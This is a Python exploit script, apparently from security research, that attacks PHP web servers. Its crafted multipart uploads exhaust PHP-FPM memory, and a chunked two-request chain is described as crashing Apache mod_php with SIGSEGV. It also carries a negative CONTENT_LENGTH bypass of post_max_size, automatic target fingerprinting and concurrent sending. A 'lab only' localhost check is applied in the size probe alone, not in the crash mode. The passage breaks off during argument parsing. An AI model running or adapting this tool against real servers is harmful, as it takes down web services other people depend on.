#!/usr/bin/env python3
"""
Generic PHP-FPM OOM lab sender (HTTP via nginx, or direct FastCGI).

Payload
-------
Multipart/form-data with N file parts:

    Content-Disposition: form-data; name="p{i}[k...0][k...1]...[k...d-1]"; filename=""
    Content-Type: text/plain

    (empty body)

Why this shape
--------------
- filename=""  -> PHP skips temp-file creation and does NOT consume a
  max_file_uploads slot, but still registers 6 $_FILES metadata entries;
- nested name  -> multiplies array/hash-table allocations;
- empty body   -> keeps the wire size below post_max_size (default 8M), so the
  OOM is caused by metadata amplification, not by raw body size.

Expected result (PHP-FPM)
-------------------------
- response contains "Allowed memory size ... exhausted" (when the fatal error
  reaches the client; with nginx buffering on it may instead be 502/empty 200);
- FPM log: "child ... exited with code 70", then a new child starts;
- no SIGSEGV / no core (this is FPM worker churn, not the mod_php crash chain).

Safety
------
Only 127.0.0.1 / localhost / ::1. Lab use only.

Examples
--------
Default (no --payload): preflight same-size control group, then small oom:
    python3 fpm_oom_generic.py --url http://127.0.0.1:8082/index.php
    python3 fpm_oom_generic.py --url http://127.0.0.1:8082/index.php --no-control

oom only (skip the preflight control group):
    python3 fpm_oom_generic.py --payload oom \
        --url http://127.0.0.1:8082/index.php
    python3 fpm_oom_generic.py --payload oom --fcgi 127.0.0.1:9003 \
        --script /usr/local/lib/php/peclcmd.php

auto -- fingerprint the target and try applicable payloads:
    # nginx/FPM: runs nested, skips modphp-crash
    python3 fpm_oom_generic.py --payload auto \
        --url http://127.0.0.1:8082/index.php

    # Apache/mod_php: runs modphp-crash first, then nested
    python3 fpm_oom_generic.py --payload auto \
        --url http://127.0.0.1:8112/index.php \
        --restart-container php8511-pure --docker-container php8511-pure

Explicit payload selection (optional):
    python3 fpm_oom_generic.py --payload nested \
        --url http://127.0.0.1:8082/index.php -k 1

    python3 fpm_oom_generic.py --payload modphp-crash \
        --url http://127.0.0.1:8112/index.php \
        --restart-container php8511-pure --docker-container php8511-pure

Direct FastCGI:
    python3 fpm_oom_generic.py --fcgi 127.0.0.1:9003 \
        --script /usr/local/lib/php/peclcmd.php -k 1

Size-limit probe (HTTP, increasing body sizes):
    python3 fpm_oom_generic.py --probe-sizes \
        --url http://127.0.0.1:8082/index.php \
        --probe-list 0.5,1,2,4,8,16,32
    # 413 = body size limit; 502/503/504 = upstream/proxy;
    # 500 = PHP fatal/OOM; 200+empty = buffered OOM

Same-size control group (HTTP):
    python3 fpm_oom_generic.py --control \
        --url http://127.0.0.1:8082/index.php \
        --control-size-mb 4.8
    # one normal multipart field of the same size + health check + verdict

Notes
-----
- auto mode uses the Server / X-Powered-By headers:
    nginx            -> nested only
    Apache/mod_php   -> modphp-crash first, then nested
    unknown          -> nested first, then modphp-crash
- nested mode is for FPM: it causes OOM + worker churn (code 70), not SIGSEGV.
  The verdict is HTTP-only: set 'fastcgi_buffering off;' in the nginx PHP
  location so the fatal error reaches the client.  empty200/502 is still
  reported as suspected_oom, but the reliable signal is the OOM text in body.
- PHP 5.x / large-body bypass (direct FastCGI only):
    python3 fpm_oom_generic.py --fcgi 127.0.0.1:9014 \
        --script /var/www/html/index.php \
        --big-name-mb 26 -n 0 --content-length -1 -k 1
  This is a NON-FILE payload: one normal field whose NAME is 26MiB, no
  filename and no file part.  At memory_limit=128M, 25MiB does not OOM and
  26MiB does (empirical; scales with memory_limit).  CONTENT_LENGTH -1
  bypasses the PHP 5.x rfc1867 post_max_size check; FPM's read_post wraps
  the negative length and reads until STDIN EOF.  PHP 5.6 may return a
  timeout/broken pipe instead of the fatal error; 8.x returns the OOM text.
  The older alternative is --pad-mb 150 (normal field VALUE, ~1:1 memory).
- payload size vs crash: `--payload nested` (~5.3MB) and `--header-lines`
  (~4.8MB) are OOM producers, but did NOT produce SIGSEGV on mod_php in our
  tests.  The verified crash chain is `--payload modphp-crash` (~48MB + ~43MB
  at memory_limit=128M): the 11MB nested name is copied ~10x in the startup
  parser, and the 35MB/30MB pads consume the remaining budget.  Smaller OOM
  is not automatically the crash chain.
- modphp-crash mode is for Apache mod_php: it sends 35MB -> 30MB pad and an
  11MB nested empty-filename name over chunked encoding.  It needs a FRESH
  worker; if the workers were already OOMed by earlier runs, it may only OOM.
  Use --restart-container to restart the lab container before the pair.
  --docker-container is used only here, to count SIGSEGV in the crash mode.
"""

from __future__ import annotations

import argparse
import http.client
import os
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse

# FastCGI constants
FCGI_BEGIN_REQUEST = 1
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_RESPONDER = 1

ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
MAX_CONCURRENCY = 32
OOM_MARKER = b"Allowed memory size"

_COLOR = False


def set_color(enabled: bool) -> None:
    global _COLOR
    _COLOR = enabled


def clr(text, code: str) -> str:
    """ANSI color helper; no-op when color is disabled."""
    text = str(text)
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def oom_text(flag: bool) -> str:
    # bold green when the OOM marker is present, dim when it is not
    return clr("oom=True", "1;32") if flag else clr("oom=False", "2")


def bool_text(flag: bool, code: str = "1;33") -> str:
    return clr(str(flag), code) if flag else clr(str(flag), "2")


def human_size(n: int) -> str:
    if n >= 1024 * 1024:
        return f"{n / (1024 * 1024):.2f}MiB"
    if n >= 1024:
        return f"{n / 1024:.1f}KiB"
    return f"{n}B"


# --------------------------------------------------------------------------- #
# Payload
# --------------------------------------------------------------------------- #
def build_body(parts: int, depth: int, keylen: int, boundary: bytes,
               pad_mb: float = 0.0, big_name_mb: float = 0.0,
               header_lines: int = 0) -> bytes:
    key = "k" * keylen
    out = bytearray()
    if pad_mb > 0:
        # A normal field: multipart_buffer_read_body() accumulates it in memory.
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="pad"\r\n\r\n'
        out += b"A" * int(pad_mb * 1024 * 1024)
        out += b"\r\n"
    if big_name_mb > 0:
        # Non-file amplification: a normal field with a huge NAME.
        # No filename parameter and no file part.
        huge = b"A" * int(big_name_mb * 1024 * 1024)
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + huge + b'"\r\n\r\n'
        out += b"x\r\n"
    if header_lines > 0:
        # Small header-line amplification: the multipart parser builds an
        # PHP's multipart parser allocates a mime_header_entry per line
        # (~180B per 6B wire line).
        # No file part and no post_max_size bypass needed.
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="x"\r\n'
        out += b"a: b\r\n" * header_lines
        out += b"\r\nx\r\n"
    for i in range(parts):
        name = f"p{i}" + "".join(f"[{key}{j}]" for j in range(depth))
        out += b"--" + boundary + b"\r\n"
        out += (
            b'Content-Disposition: form-data; name="'
            + name.encode()
            + b'"; filename=""\r\n'
        )
        out += b"Content-Type: text/plain\r\n\r\n"
        out += b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# --------------------------------------------------------------------------- #
# HTTP sender (nginx -> FPM)
# --------------------------------------------------------------------------- #
def send_http(url: str, body: bytes, boundary: bytes, timeout: float):
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Content-Length": str(len(body)),
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, data, ""
    except OSError as exc:
        return None, b"", str(exc)
    finally:
        conn.close()


def send_http_probe(url: str, body: bytes, boundary: bytes, timeout: float):
    """HTTP send that also returns response headers (for size-limit probing)."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Content-Length": str(len(body)),
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, data, "", hdrs
    except OSError as exc:
        return None, b"", str(exc), {}
    finally:
        conn.close()


def send_http_raw(url: str, body: bytes, content_type: str, timeout: float):
    """Generic HTTP POST; returns (status, body, error, headers)."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": content_type,
        "Content-Length": str(len(body)),
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, data, "", hdrs
    except OSError as exc:
        return None, b"", str(exc), {}
    finally:
        conn.close()


def send_http_get(url: str, timeout: float):
    """Health-check GET; returns (status, body, error, headers)."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path, headers={"Connection": "close"})
        resp = conn.getresponse()
        data = resp.read()
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, data, "", hdrs
    except OSError as exc:
        return None, b"", str(exc), {}
    finally:
        conn.close()


def _probe_note(status, data: bytes, error: str) -> str:
    if error:
        return "connection dropped / reset (possible OOM/crash or proxy reset)"
    if status == 413:
        return "BODY SIZE LIMIT (413: client_max_body_size / LimitRequestBody)"
    if status in (502, 503, 504):
        return ("UPSTREAM UNAVAILABLE / FPM pool exhausted / proxy limit "
                "(502/503/504)")
    if status == 500:
        return "PHP fatal/OOM (500; display_errors may hide the text)"
    if status == 200 and not data:
        return "empty 200 (buffered OOM or normal empty response)"
    if status == 200:
        return "accepted"
    return ""


def run_probe_sizes(args) -> int:
    """Send increasing body sizes and show status/Server to find size limits."""
    if not args.url:
        print("[!] --probe-sizes requires --url (HTTP)", file=sys.stderr)
        return 2
    host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        print(f"[!] refusing non-local target {host!r}; lab only", file=sys.stderr)
        return 2
    try:
        sizes = [float(x) for x in args.probe_list.split(",") if x.strip()]
    except ValueError:
        print("[!] --probe-list must be comma-separated numbers (MiB)",
              file=sys.stderr)
        return 2
    if not sizes or any(s < 0 or s > 256 for s in sizes):
        print("[!] probe sizes must be 0..256 MiB", file=sys.stderr)
        return 2

    print(f"[*] size probe target={args.url} sizes={sizes} MiB")
    print("[*] 413=size limit; 502/503/504=upstream/proxy; "
          "500=PHP fatal/OOM; 200+empty=buffered OOM")
    for mb in sizes:
        boundary = b"----probe-" + os.urandom(6).hex().encode()
        body = build_body(0, args.depth, args.keylen, boundary, pad_mb=mb)
        status, data, error, hdrs = send_http_probe(
            args.url, body, boundary, args.timeout
        )
        server = hdrs.get("server", "")
        ctype = hdrs.get("content-type", "")
        note = _probe_note(status, data, error)
        print(
            f"[probe] {mb:>6.1f}MiB body={len(body):>9}B "
            f"({human_size(len(body))}) status={status} "
            f"resp={len(data)}B server={server!r} ctype={ctype!r} "
            f"note={note} err={error!r}",
            flush=True,
        )
        if data:
            n = args.body_bytes if args.body_bytes > 0 else 300
            print(f"        head={data[:min(n, 300)]!r}", flush=True)
    return 0


def run_control(args) -> int:
    """Same-size normal-upload control.

    Sends ONE normal multipart field of --control-size-mb and a health GET
    before/after.  If this succeeds but the header-amplification payload
    fails, the failure is shape-specific (parser OOM), not a size limit.
    """
    if not args.url:
        print("[!] --control requires --url (HTTP)", file=sys.stderr)
        return 2
    if args.control_size_mb <= 0 or args.control_size_mb > 256:
        print("[!] --control-size-mb must be 0..256", file=sys.stderr)
        return 2

    health_url = args.health_url or args.url
    boundary = b"----control-" + os.urandom(6).hex().encode()
    mp = f"multipart/form-data; boundary={boundary.decode()}"
    body = build_body(0, args.depth, args.keylen, boundary,
                      pad_mb=args.control_size_mb)

    hst, _, herr, _ = send_http_get(health_url, args.timeout)
    print(f"[*] control target={args.url} health={hst} err={herr!r} "
          f"size={args.control_size_mb}MiB (one normal field)")
    st, data, err, hdrs = send_http_raw(args.url, body, mp, args.timeout)
    hst2, _, _, _ = send_http_get(health_url, args.timeout)
    server = hdrs.get("server", "")
    oom = b"Allowed memory size" in data
    note = _probe_note(st, data, err)
    print(
        f"[control] normal-upload body={len(body)}B "
        f"({human_size(len(body))}) status={st} resp={len(data)}B "
        f"oom={oom} health={hst2} server={server!r} "
        f"note={note} err={err!r}",
        flush=True,
    )
    if data:
        n = args.body_bytes if args.body_bytes > 0 else 300
        print(f"        head={data[:min(n, 300)]!r}", flush=True)

    if st == 413:
        verdict = "SIZE LIMIT (413)"
    elif st is None or st >= 500:
        verdict = "SERVER/UNAVAILABLE or upstream failure"
    elif oom:
        verdict = "SAME-SIZE NORMAL UPLOAD ALSO OOM (size/limit-related)"
    elif st in (200, 201, 202, 204, 400, 401, 403, 404, 415):
        verdict = ("SAME-SIZE NORMAL UPLOAD OK (processed); "
                   "the OOM failure is shape-specific")
    else:
        verdict = f"unexpected status {st}"
    print(f"\n[*] verdict: {verdict}")
    args._control_verdict = verdict
    return 0


# --------------------------------------------------------------------------- #
# FastCGI sender (direct to FPM)
# --------------------------------------------------------------------------- #
def fcgi_record(rec_type: int, content: bytes, request_id: int = 1) -> bytes:
    padding = (-len(content)) % 8
    return (
        struct.pack("!BBHHBB", 1, rec_type, request_id, len(content), padding, 0)
        + content
        + b"\x00" * padding
    )


def nv_pair(name: str, value: str) -> bytes:
    nb, vb = name.encode(), value.encode()
    out = b""
    for n in (len(nb), len(vb)):
        out += bytes([n]) if n < 128 else struct.pack("!I", n | 0x80000000)
    return out + nb + vb


def send_fcgi(host: str, port: int, script: str, body: bytes,
              boundary: bytes, timeout: float, content_length=None):
    params = {
        "GATEWAY_INTERFACE": "CGI/1.1",
        "SERVER_SOFTWARE": "fpm-oom-generic",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/" + script.rsplit("/", 1)[-1],
        "REQUEST_URI": "/" + script.rsplit("/", 1)[-1],
        "DOCUMENT_ROOT": "/var/www/html",
        "CONTENT_TYPE": f"multipart/form-data; boundary={boundary.decode()}",
        "CONTENT_LENGTH": (str(content_length) if content_length is not None
                           else str(len(body))),
        "SERVER_NAME": "localhost",
        "SERVER_PORT": str(port),
        "REMOTE_ADDR": "127.0.0.1",
    }
    blob = b"".join(nv_pair(k, v) for k, v in params.items())

    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    stdout, stderr = bytearray(), bytearray()
    app_status = None
    error = ""
    send_error = [""]

    def sender() -> None:
        try:
            sock.sendall(fcgi_record(FCGI_BEGIN_REQUEST,
                                     struct.pack("!HB5x", FCGI_RESPONDER, 0)))
            sock.sendall(fcgi_record(FCGI_PARAMS, blob))
            sock.sendall(fcgi_record(FCGI_PARAMS, b""))
            for off in range(0, len(body), 65535):
                sock.sendall(fcgi_record(FCGI_STDIN, body[off:off + 65535]))
            sock.sendall(fcgi_record(FCGI_STDIN, b""))
        except OSError as exc:
            send_error[0] = str(exc)

    def recv_exact(n: int) -> bytes:
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("connection closed")
            data += chunk
        return data

    thread = threading.Thread(target=sender, daemon=True)
    thread.start()
    try:
        while True:
            header = recv_exact(8)
            _, rec_type, _, content_len, padding_len, _ = struct.unpack(
                "!BBHHBB", header
            )
            content = recv_exact(content_len)
            if padding_len:
                recv_exact(padding_len)

            if rec_type == FCGI_STDOUT:
                stdout += content
            elif rec_type == FCGI_STDERR:
                stderr += content
            elif rec_type == FCGI_END_REQUEST:
                app_status = struct.unpack("!I", content[:4])[0]
                break
    except (ConnectionError, OSError) as exc:
        error = str(exc)
    finally:
        thread.join(timeout=2.0)
        try:
            sock.close()
        except OSError:
            pass

    if not error and send_error[0]:
        error = send_error[0]
    return app_status, bytes(stdout), bytes(stderr), error


# --------------------------------------------------------------------------- #
# mod_php crash chain (two chunked requests, same keep-alive connection)
# --------------------------------------------------------------------------- #
def build_modphp_body(pad_mb: float, name_mb: float, boundary: bytes) -> bytes:
    """Same shape as php8511_chunked_repro.py."""
    def part(headers: bytes, body: bytes) -> bytes:
        return b"--" + boundary + b"\r\n" + headers + b"\r\n\r\n" + body + b"\r\n"

    out = bytearray()
    out += part(b'Content-Disposition: form-data; name="pad"', b"")
    out += b"A" * int(pad_mb * 1024 * 1024) + b"\r\n"
    name = b"A" * int(name_mb * 1024 * 1024) + b"[k]"
    out += part(
        b'Content-Disposition: form-data; name="' + name
        + b'"; filename=""\r\nContent-Type: text/plain',
        b"x",
    )
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def chunked_encode(data: bytes, chunk: int = 1 << 20) -> bytes:
    out = bytearray()
    for off in range(0, len(data), chunk):
        piece = data[off:off + chunk]
        out += f"{len(piece):x}".encode() + b"\r\n" + piece + b"\r\n"
    out += b"0\r\n\r\n"
    return bytes(out)


def read_http_response(sock: socket.socket):
    """Read one HTTP response. Returns (status, body); status None on EOF."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            return None, buf
        buf += chunk

    header, _, rest = buf.partition(b"\r\n\r\n")
    lines = header.split(b"\r\n")
    status = None
    if lines and lines[0].startswith(b"HTTP/"):
        try:
            status = int(lines[0].split(b" ")[1])
        except (IndexError, ValueError):
            pass

    content_length = None
    is_chunked = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"content-length:"):
            try:
                content_length = int(line.split(b":", 1)[1].strip())
            except ValueError:
                pass
        elif lower.startswith(b"transfer-encoding:") and b"chunked" in lower:
            is_chunked = True

    if is_chunked:
        data = rest
        while b"\r\n0\r\n\r\n" not in data and not data.endswith(b"0\r\n\r\n"):
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
        return status, data

    if content_length is not None:
        while len(rest) < content_length:
            chunk = sock.recv(65536)
            if not chunk:
                break
            rest += chunk
        return status, rest[:content_length]

    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        rest += chunk
    return status, rest


def _crash_headers(host: str, port: int, path: str, boundary: bytes,
                   close: bool) -> bytes:
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Connection: {'close' if close else 'keep-alive'}\r\n\r\n"
    ).encode()


def send_crash_pair(url: str, body1: bytes, body2: bytes, boundary: bytes,
                    keepalive: bool, timeout: float, delay: float):
    """Send the two-request mod_php chain.

    Returns (same_connection, st1, resp1, st2, resp2, err, note).
    """
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    def send_one(sock: socket.socket, body: bytes, close: bool):
        sock.sendall(_crash_headers(host, port, path, boundary, close))
        sock.sendall(chunked_encode(body))
        return read_http_response(sock)

    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        st1, resp1 = send_one(sock, body1, False)
    except OSError as exc:
        sock.close()
        return False, None, b"", None, b"", str(exc), "req1-error"

    if delay:
        time.sleep(delay)

    if keepalive:
        try:
            st2, resp2 = send_one(sock, body2, True)
            sock.close()
            return True, st1, resp1, st2, resp2, "", "same-connection"
        except OSError as exc:
            sock.close()
            # fall back to a fresh connection for the second request
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            try:
                st2, resp2 = send_one(sock, body2, True)
                return False, st1, resp1, st2, resp2, "", f"fallback: {exc}"
            except OSError as exc2:
                return False, st1, resp1, None, b"", str(exc2), "req2-error"
            finally:
                sock.close()

    sock.close()
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        st2, resp2 = send_one(sock, body2, True)
        return False, st1, resp1, st2, resp2, "", "separate-connection"
    except OSError as exc:
        return False, st1, resp1, None, b"", str(exc), "req2-error"
    finally:
        sock.close()


def docker_sigsegv_count(container: str):
    try:
        result = subprocess.run(
            ["docker", "logs", container],
            capture_output=True, text=True, timeout=20,
        )
        return (result.stdout + result.stderr).count("Segmentation fault")
    except Exception:
        return None


def docker_restart(container: str) -> bool:
    try:
        subprocess.run(
            ["docker", "restart", container],
            check=True, stdout=subprocess.DEVNULL, timeout=120,
        )
        return True
    except Exception as exc:
        print(f"[!] docker restart failed: {exc}", file=sys.stderr)
        return False


def wait_http_ready(url: str, timeout: float = 30.0) -> bool:
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            conn = http.client.HTTPConnection(host, port, timeout=3)
            conn.request("GET", path)
            conn.getresponse().read()
            conn.close()
            return True
        except (OSError, http.client.HTTPException):
            time.sleep(0.3)
    return False


def run_modphp_crash(args) -> int:
    if not args.url:
        print("[!] --payload modphp-crash requires --url (mod_php endpoint)",
              file=sys.stderr)
        return 2
    host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
    if args.requests < 1:
        print("[!] --requests must be >= 1", file=sys.stderr)
        return 2

    if args.restart_container:
        print(f"[!] restarting lab container {args.restart_container!r} ...")
        if not docker_restart(args.restart_container):
            return 2
        if not wait_http_ready(args.url, timeout=60):
            print("[!] target not ready after restart", file=sys.stderr)
            return 2

    boundary = (args.boundary.encode() if args.boundary
                else b"----modphpcrash")
    body1 = build_modphp_body(args.pad1_mb, args.name_mb, boundary)
    body2 = build_modphp_body(args.pad2_mb, args.name_mb, boundary)

    before = (docker_sigsegv_count(args.docker_container)
              if args.docker_container else None)

    print(
        f"[*] mode=modphp-crash target={args.url}\n"
        f"[*] body1={len(body1)}B ({human_size(len(body1))}) "
        f"(pad={args.pad1_mb}MB) "
        f"body2={len(body2)}B ({human_size(len(body2))}) "
        f"(pad={args.pad2_mb}MB) name={args.name_mb}MB\n"
        f"[*] pairs={args.requests} keepalive={not args.no_keepalive} "
        f"delay={args.delay}s"
    )

    for pair in range(1, args.requests + 1):
        same, st1, r1, st2, r2, err, note = send_crash_pair(
            args.url, body1, body2, boundary,
            keepalive=not args.no_keepalive,
            timeout=args.timeout, delay=args.delay,
        )
        print(
            f"[{pair:04d}] req1 status={st1} {oom_text(OOM_MARKER in r1)} "
            f"resp={len(r1)}B | req2 status={st2} "
            f"{oom_text(OOM_MARKER in r2)} "
            f"resp={len(r2)}B | same_conn={same} note={note} err={err!r}",
            flush=True,
        )
        if args.body_bytes > 0:
            if r1:
                print(f"        req1={r1[:args.body_bytes]!r}", flush=True)
            if r2:
                print(f"        req2={r2[:args.body_bytes]!r}", flush=True)

    # Apache writes the SIGSEGV line slightly after the connection drops.
    # Poll the container log for a few seconds instead of counting immediately.
    after = before
    if args.docker_container and before is not None:
        deadline = time.monotonic() + 5.0
        while time.monotonic() < deadline:
            time.sleep(0.25)
            after = docker_sigsegv_count(args.docker_container)
            if after is None or after > before:
                break
    elif args.docker_container:
        after = docker_sigsegv_count(args.docker_container)
    else:
        time.sleep(0.5)

    if before is not None and after is not None:
        new = after - before
        print(f"\n[*] {clr('SIGSEGV', '1;31')} ({args.docker_container}): "
              f"before={before} after={after} "
              f"new={clr(new, '1;32' if new > 0 else '1;31')}")
        if new == 0:
            print(
                "[*] no new SIGSEGV. The workers may be dirty from earlier OOMs.\n"
                "    Restart the container and retry, or pass --restart-container."
            )
    return 0


def run_oom_probe(args) -> int:
    """Small OOM detection: header-line amplification, no crash chain.

    Default 800k header lines (~4.8MB).  This is enough to OOM 128M on the
    tested builds; it does NOT try to reach the $_FILES consumer/SIGSEGV path.
    For higher memory_limit, increase --header-lines (and use a bypass if the
    body exceeds post_max_size).
    """
    if args.header_lines == 0:
        args.header_lines = 800000
    args.parts = 0
    return run_nested(args)


def detect_http_identity(url: str):
    """Best-effort SAPI fingerprint from response headers."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    conn = http.client.HTTPConnection(host, port, timeout=5)
    try:
        conn.request("GET", path)
        resp = conn.getresponse()
        resp.read()
        return resp.getheader("Server", "") or "", resp.getheader("X-Powered-By", "") or ""
    except Exception:
        return "", ""
    finally:
        conn.close()


def run_auto(args) -> int:
    """Try the applicable payloads automatically.

    - FastCGI target: nested only (modphp-crash is HTTP-only).
    - nginx/FPM:     nested only (the mod_php crash chain does not apply).
    - Apache/mod_php: modphp-crash first (fresh workers matter), then nested.
    - Unknown:       nested first, then modphp-crash as a fallback.
    """
    print("[*] payload=auto: trying applicable payloads")

    if args.fcgi:
        print("[*] FastCGI target: modphp-crash is HTTP-only; nested only")
        return run_nested(args)

    if not args.url:
        print("[!] auto mode needs --url or --fcgi", file=sys.stderr)
        return 2

    server, powered = detect_http_identity(args.url)
    print(f"[*] fingerprint: Server={server!r} X-Powered-By={powered!r}")
    server_l = server.lower()
    powered_l = powered.lower()
    is_nginx = "nginx" in server_l
    # nginx also forwards "X-Powered-By: PHP", so only trust X-Powered-By
    # as a mod_php signal when the front end is not nginx.
    is_modphp = (not is_nginx) and (("apache" in server_l) or ("php" in powered_l))

    if is_modphp:
        print("[*] target looks like mod_php: modphp-crash first, then nested")
        rc = run_modphp_crash(args)
        run_nested(args)
        return rc

    print("[*] running nested first")
    rc = run_nested(args)
    if is_nginx:
        print("[*] nginx/FPM detected: skipping modphp-crash (not applicable)")
    else:
        print("[*] target unknown: trying modphp-crash as a fallback")
        run_modphp_crash(args)
    return rc


def run_all(args) -> int:
    """Run both payloads unconditionally (even if the target looks like FPM)."""
    print("[*] payload=all: running nested + modphp-crash unconditionally")
    if args.fcgi:
        print("[*] FastCGI target: modphp-crash is HTTP-only; nested only")
        return run_nested(args)
    if not args.url:
        print("[!] all mode needs --url or --fcgi", file=sys.stderr)
        return 2

    server, powered = detect_http_identity(args.url)
    print(f"[*] fingerprint: Server={server!r} X-Powered-By={powered!r}")
    server_l = server.lower()
    powered_l = powered.lower()
    is_nginx = "nginx" in server_l
    is_modphp = (not is_nginx) and (("apache" in server_l) or ("php" in powered_l))

    if is_modphp:
        print("[*] mod_php-like: modphp-crash first, then nested")
        rc = run_modphp_crash(args)
        rc |= run_nested(args)
    else:
        print("[*] non-mod_php-like: nested first, then modphp-crash")
        rc = run_nested(args)
        rc |= run_modphp_crash(args)
    return rc


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Generic PHP-FPM OOM lab sender (HTTP or FastCGI)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    target = ap.add_mutually_exclusive_group(required=True)
    target.add_argument("--url", help="HTTP endpoint, e.g. http://127.0.0.1:8082/index.php")
    target.add_argument("--fcgi", help="FastCGI host:port, e.g. 127.0.0.1:9003")
    ap.add_argument("--payload",
                    choices=["auto", "all", "oom", "nested", "modphp-crash"],
                    default=None,
                    help="default (no --payload): preflight control group + oom; "
                         "oom=small OOM detection (header lines ~4.8MB); "
                         "auto=fingerprint and try applicable payloads; "
                         "all=run both unconditionally; "
                         "nested=FPM OOM metadata payload (~5.3MB, no SIGSEGV); "
                         "modphp-crash=verified two-request SIGSEGV chain "
                         "(~48MB+~43MB at memory_limit=128M)")
    ap.add_argument("--no-control", action="store_true",
                    help="skip the preflight control group in default mode")
    ap.add_argument("--pad1-mb", type=float, default=35.0,
                    help="modphp-crash: first request pad in MiB")
    ap.add_argument("--pad2-mb", type=float, default=30.0,
                    help="modphp-crash: second request pad in MiB")
    ap.add_argument("--name-mb", type=float, default=11.0,
                    help="modphp-crash: nested field name size in MiB")
    ap.add_argument("--no-keepalive", action="store_true",
                    help="modphp-crash: use separate connections for the two requests")
    ap.add_argument("--delay", type=float, default=0.5,
                    help="modphp-crash: seconds between the two requests")
    ap.add_argument("--docker-container", default=None,
                    help="modphp-crash only: container name for SIGSEGV counting")
    ap.add_argument("--restart-container", default=None,
                    help="optional lab container to restart before modphp-crash")
    ap.add_argument("--script", default="/var/www/html/index.php",
                    help="SCRIPT_FILENAME for FastCGI mode")
    ap.add_argument("-n", "--parts", type=int, default=1000,
                    help="nested: number of file parts")
    ap.add_argument("-d", "--depth", type=int, default=50,
                    help="nested: nested array depth per part")
    ap.add_argument("-l", "--keylen", type=int, default=100,
                    help="nested: length of each nested key")
    ap.add_argument("-k", "--requests", type=int, default=1,
                    help="nested: total requests; modphp-crash: number of pairs")
    ap.add_argument("-c", "--concurrency", type=int, default=1,
                    help=f"nested: threads, 1..{MAX_CONCURRENCY}")
    ap.add_argument("--rate", type=float, default=0.0,
                    help="nested: max requests/sec (0 = unlimited)")
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--boundary", default=None,
                    help="optional multipart boundary (default: random)")
    ap.add_argument("--show-body", action="store_true",
                    help="deprecated: body preview is now on by default")
    ap.add_argument("--pad-mb", type=float, default=0.0,
                    help="nested: prepend a normal field of this many MiB "
                         "(for post_max_size bypass tests)")
    ap.add_argument("--big-name-mb", type=float, default=0.0,
                    help="nested: prepend a normal field whose NAME is this many "
                         "MiB (non-file name amplification; combine with -n 0)")
